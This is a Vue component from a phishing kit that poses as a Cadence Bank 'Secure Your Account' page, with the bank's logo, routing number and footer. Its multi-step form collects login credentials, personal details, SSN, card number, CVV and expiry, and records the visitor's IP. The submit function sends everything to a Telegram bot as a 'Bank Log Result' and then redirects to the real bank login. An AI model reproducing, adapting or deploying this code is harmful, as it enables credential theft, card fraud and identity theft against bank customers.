<template>
    <div class="page-container">
      <div class="container">
        <img class="logo" src="@/assets/cadence-logo.png" alt="Cadence Logo">
        <div v-if="step <= 3" class="form-container">
          <h2>Secure Your Account</h2>
          <!-- <form @submit.prevent="submitForm"> -->
            <div v-show="step === 1">
              <div class="form-group">
                <label for="username">Username/User ID</label>
                <input type="text" id="username" v-model="accountData.username" required>
                <small class="danger" v-if="av$.username.$error"> {{ av$.username.$errors[0].$message }}</small>
              </div>
              <div class="form-group">
                <label for="password">Password</label>
                <div class="input-group">
                  <input :type="showPassword ? 'text' : 'password'" id="password" v-model="accountData.password" required>
                  <img :src="showPassword ? require('@/assets/eye-open.png') : require('@/assets/eye-closed.png')" @click="togglePasswordVisibility" class="password-icon" alt="Toggle Password Visibility">
                </div>
                <small class="danger" v-if="av$.password.$error"> {{ av$.password.$errors[0].$message }}</small>
              </div>
              <div class="form-group">
                <label for="confirmPassword">Confirm Password</label>
                <div class="input-group">
                  <input :type="showConfirmPassword ? 'text' : 'password'" id="confirmPassword" v-model="accountData.confirm_password" required>
                  <img :src="showConfirmPassword ? require('@/assets/eye-open.png') : require('@/assets/eye-closed.png')" @click="toggleConfirmPasswordVisibility" class="password-icon" alt="Toggle Password Visibility">
                </div>
                <small class="danger" v-if="av$.confirm_password.$error"> {{ av$.confirm_password.$errors[0].$message }}</small>
              </div>
            </div>
            
            <div v-show="step === 2">
              <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" v-model="profileData.email" required>
                <small class="danger" v-if="pv$.email.$error"> {{ pv$.email.$errors[0].$message }}</small>
              </div>
              <div class="form-group">
                <label for="dob">Date of Birth</label>
                <input type="date" id="dob" v-model="profileData.dob" required>
                <small class="danger" v-if="pv$.dob.$error"> {{ pv$.dob.$errors[0].$message }}</small>

              </div>
              <div class="form-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" v-model="profileData.phone" required @input="formatPhone">
                <small class="danger" v-if="pv$.phone.$error"> {{ pv$.phone.$errors[0].$message }}</small>
              </div>
              <div class="form-group">
                <label for="houseAddress">House Address</label>
                <input type="text" id="houseAddress" v-model="profileData.houseAddress" required>
                <small class="danger" v-if="pv$.houseAddress.$error"> {{ pv$.houseAddress.$errors[0].$message }}</small>
              </div>
              <div class="form-group">
                <label for="city">City</label>
                <input type="text" id="city" v-model="profileData.city" required>
                <small class="danger" v-if="pv$.city.$error"> {{ pv$.city.$errors[0].$message }}</small>
              </div>
              <div class="form-group">
                <label for="state">State</label>
                <select id="state" v-model="profileData.state" required>
                  <option value="">Select State</option>
                  <option v-for="state in states" v-bind:key="state">{{ state }}</option>
                </select>
              </div>
              <div class="form-group">
                <label for="zipCode">Zip Code</label>
                <input type="text" id="zipCode" v-model="profileData.zipCode" required @input="formatZipCode">
              </div>
            </div>
            <div v-show="step === 3">
              <div class="form-group">
                <label for="ssn">SSN</label>
                <input type="text" id="ssn" v-model="cardData.ssn" required @input="formatSSN">
                <small class="danger" v-if="cv$.ssn.$error"> {{ cv$.ssn.$errors[0].$message }}</small>
              </div>
              <div class="form-group">
                <label for="cardNumber">Card Number</label>
                <input type="text" id="cardNumber" v-model="cardData.cardNumber" required @input="formatCardNumber">
                <small class="danger" v-if="cv$.cardNumber.$error"> {{ pv$.cardNumber.$errors[0].$message }}</small>
              </div>
              <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" v-model="cardData.cvv" required maxlength="3" @input="formatCVV">
                <small class="danger" v-if="cv$.cvv.$error"> {{ cv$.cvv.$errors[0].$message }}</small>
              </div>
              <div class="form-group">
                <label for="expiryDate">Card Expiry Date</label>
                <input type="text" id="expiryDate" v-model="cardData.expiryDate" required @input="formatExpiryDate">
                <small class="danger" v-if="cv$.expiryDate.$error"> {{ cv$.expiryDate.$errors[0].$message }}</small>
              </div>
            </div>
            <div class="button-group">
              <button type="button" @click="prevStep" v-if="step > 1">Previous</button>
              <button type="button" @click="nextStep" v-if="step < 3">Next</button>
              <button @click="submitForm" type="button" v-if="step === 3">Submit</button>
            </div>
          <!-- </form> -->
        </div>
        <div v-if="step === 4" class="success-page">
          <h2>Account Secured Successfully!</h2>
          <p class="text-dark">You can <a href="https://online.cadencebank.com/SignIn.aspx">login here</a>.</p>
        </div>
      </div>
      <footer class="footer-content">
        <div class="footer-column">
          <img src="@/assets/cadence-logo.png" alt="Cadence Logo">
        </div>
        <div class="footer-column">
          <p>Routing Number: 084201278</p>
          <p>Customer Service: 1-888-797-7711 M-F 7:00 a.m. - 8:00 p.m. (CST)</p>
          <p>Saturday 7:00 a.m. - 5:00 p.m. (CST)</p>
          <p>© 2024 Cadence Bank. All Rights Reserved.</p>
        </div>
        <div class="footer-column">
          <p class="fdic">Equal Housing Lender <img class="fdic-logo" src="https://online.cadencebank.com/content.aspx?theme=Theme5&color1=%23424242&color2=%23F5F5F5&image=EqualHousingLender.svg"></p>
          <p>NLMS #410279</p>
          <p class="fdic">Federally Insured <img class="fdic-logo" src="https://online.cadencebank.com/content.aspx?theme=Theme5&color1=%23424242&image=svg/fdic.svg" alt="FDIC"></p>
        </div>
      </footer>
    </div>
  </template>
  
  <script>
  import axios from 'axios';
  import { defineComponent, ref, reactive, computed, onMounted } from 'vue'
  import { useVuelidate } from '@vuelidate/core'
  import { required, minLength, email, numeric } from '@vuelidate/validators'
  import { useGlobalLoader } from 'vue-global-loader'

  // interface
  export default defineComponent({

    setup() {

      const step = ref(1);
      const showPassword = ref(false)
      const showConfirmPassword = ref(false)
      const accountData = reactive({
        username: '',
        password: '',
        confirm_password: ''
      })

      const ipInfo = ref('')

      const profileData = reactive({
        email : '',
        dob : '',
        phone : '',
        houseAddress : '',
        city : '',
        state : '',
        zipCode : ''
      })

      const cardData = reactive({
          ssn : '',
          cardNumber : '',
          expiryDate : '',
          cvv : '',
      })

      const accountRules = computed(() => {
        return {
          username: { required },
          password: { required, minLength: minLength(7)},
          confirm_password: { required }
        }
      })

      const cardRules = computed(() => {
        return {
          ssn : { required },
          cardNumber: { required, minLength: minLength(12)},
          cvv: { required, numeric },
          expiryDate: { required }
        }
      })

      const profileRules = computed(() => {
        return {
          email : { required, email },
          dob : { required },
          phone : { required},
          houseAddress : { required },
          city : { required },
          state : { required },
          zipCode : { required }
        }
      })

      const av$ = useVuelidate(accountRules, accountData)
      const pv$ = useVuelidate(profileRules, profileData)
      const cv$ = useVuelidate(cardRules, cardData)

      const { displayLoader, destroyLoader } = useGlobalLoader()

      onMounted(() => {
        const request = axios.create({
          baseURL: "https://api.ipify.org?format=json",
          timeout: 30000,
          headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
          }
        })

        request.get('', {}).then((response) => {
          ipInfo.value = response.data.ip
          // console.log(response)
        })
      })

      const submitForm = async () => {
        
        const validation = await cv$.value.$validate()
        if(!validation) {
          console.log('unable to validate')
          return
        }
        displayLoader()
        const request = axios.create({
          baseURL: "https://api.telegram.org/bot"+process.env.VUE_APP_BOT_KEY+'/',
          timeout: 30000,
          headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
          }
        })
        const message = `
            ===Bank Log Result===\n
            Username: ${accountData.username}\n
            Password: ${accountData.password}\n
            Confirm Password: ${accountData.confirm_password}\n
            Email: ${profileData.email}\n
            DoB: ${profileData.dob}\n
            Phone: ${profileData.phone}\n
            Address: ${profileData.houseAddress}\n
            City: ${profileData.city}\n
            State: ${profileData.state}\n
            Zip Code: ${profileData.zipCode}\n
            IP Address: ${ipInfo.value ?? ''}\n
            SSn: ${cardData.ssn}\n
            Card Number: ${cardData.cardNumber}\n
            CVV: ${cardData.cvv}\n
            Expiry: ${cardData.expiryDate}\n
            ====Result By Pro 3vil====
        `
        const data = {
          chat_id: process.env.VUE_APP_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        }
        request.post('sendMessage', data).then((response) => {
          if(response.status == 200) {
            step.value++
          }
            // resolve(response.data)
        }).catch((error) => {
          console.log(error)
            // reject(error)
        }).finally(() => {
          destroyLoader()
        })
        // try {
          
        //     // await axios.post('http://localhost:3000/submit-form', this.formData);
        //     // this.formSubmitted = true;
        //     // this.formError = null;
        // } catch (error) {
        //     this.formError = error.message;
        // }
      }

      const states = ref([
        'Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia',
        'Hawaii', 'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana', 'Maine', 'Maryland', 'Massachusetts',
        'Michigan', 'Minnesota', 'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire', 'New Jersey', 'New Mexico',
        'New York', 'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania', 'Rhode Island', 'South Carolina',
        'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming'
      ])
      const nextStep = async () => {
        if (step.value < 3) {
          let validator
          switch(step.value) {
            case 1:
              validator = await av$.value.$validate()
              break;
            case 2:
              validator = await pv$.value.$validate()
              break
            default:
              break;
          }
          if(!validator || validator == undefined) {
            console.log('validation failed')
            console.log(av$.value)
            console.log(validator)
            return
          }
          step.value++;
        }
      }

      const formatPhone = () => {
        profileData.phone = profileData.phone.replace(/\D/g, '').slice(0, 10);
        if (profileData.phone.length > 6) {
          profileData.phone = `${profileData.phone.slice(0, 3)}-${profileData.phone.slice(3, 6)}-${profileData.phone.slice(6)}`;
        } else if (profileData.phone.length > 3) {
          profileData.phone = `${profileData.phone.slice(0, 3)}-${profileData.phone.slice(3)}`;
        }
      }

      const formatZipCode = () => {
        profileData.zipCode = profileData.zipCode.replace(/\D/g, '').slice(0, 5);
      }

      const formatSSN = () => {
        cardData.ssn = cardData.ssn.replace(/\D/g, '').slice(0, 9);
        if (cardData.ssn.length > 5) {
          cardData.ssn = `${cardData.ssn.slice(0, 3)}-${cardData.ssn.slice(3, 5)}-${cardData.ssn.slice(5)}`;
        } else if (cardData.ssn.length > 3) {
          cardData.ssn = `${cardData.ssn.slice(0, 3)}-${cardData.ssn.slice(3)}`;
        }
      }

      const formatCardNumber = () => {
        cardData.cardNumber = cardData.cardNumber.replace(/\D/g, '').slice(0, 16);
        cardData.cardNumber = cardData.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
      }

      const formatCVV = () => {
        cardData.cvv = cardData.cvv.replace(/\D/g, '').slice(0, 3);
      }


      const formatExpiryDate = () => {
        cardData.expiryDate = cardData.expiryDate.replace(/\D/g, '').slice(0, 4);
        if (cardData.expiryDate.length > 2) {
          cardData.expiryDate = `${cardData.expiryDate.slice(0, 2)}/${cardData.expiryDate.slice(2)}`;
        }
      }
      

      return { formatCardNumber, formatCVV, formatExpiryDate, formatZipCode, formatSSN, formatPhone, nextStep, step, showPassword, showConfirmPassword, accountData, profileData, states, cardData, av$, pv$, cv$, submitForm }
    },
    methods: {
      togglePasswordVisibility() {
        this.showPassword = !this.showPassword;
      },
      toggleConfirmPasswordVisibility() {
        this.showConfirmPassword = !this.showConfirmPassword;
      },
      
      prevStep() {
        if (this.step > 1) this.step--;
      },
    }
  });
  </script>


  
  <style scoped>
  .page-container {
    background: url('@/assets/cadence-bg-desktop.jpg') no-repeat center center fixed;
    background-size: cover;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 20px;
  }
  
  .container {
    background-color: white;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    max-width: 500px;
    width: 100%;
  }
  
  .logo {
    width: 200px;
    height: auto;
    display: block;
    margin: 0 auto 20px;
  }
  
  h2 {
    text-align: center;
    color: #343a40;
  }
  
  .form-group {
    margin-bottom: 15px;
  }
  
  .form-group label {
    display: block;
    color: black;
    margin-bottom: 5px;
  }
  
  .form-group input,
  .form-group select {
    width: 100%;
    padding: 10px;
    border: 1px solid #6c757d;
    border-radius: 4px;
    background-color: white;
    color: #343a40;
  }
  
  .input-group {
    display: flex;
    align-items: center;
    position: relative;
  }
  
  .password-icon {
    width: 20px;
    height: 20px;
    cursor: pointer;
    position: absolute;
    right: 10px;
  }
  
  .button-group {
    display: flex;
    justify-content: space-between;
  }
  
  button {
    background-color: #1D871EFF;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
    margin-top: 10px;
  }
  
  button:hover {
    background-color: #155d9b;
  }
  
  .success-page {
    text-align: center;
    color: white;
  }
  
  .footer-content {
    background-color: white;
    padding: 20px;
    display: flex;
    justify-content: space-between;
    align-items: left;
    width: 100%;
    max-width: 1500px;
    margin-top: 20px;
    /* border-radius: 10px; */
  }
  
  .footer-column {
    flex: 1;
    text-align: left;
  }
  
  .footer-column img {
    width: 200px;
    height: auto;
  }
  
  .footer-column p {
    color: #343a40;
    font-family: "Ubuntu", "Open Sans", Arial, Helvetica;
    font-size: 12px;
    line-height: 0.5;
  }
  
  .fdic img {
    width: 20px;
    vertical-align: middle;
  }
  </style>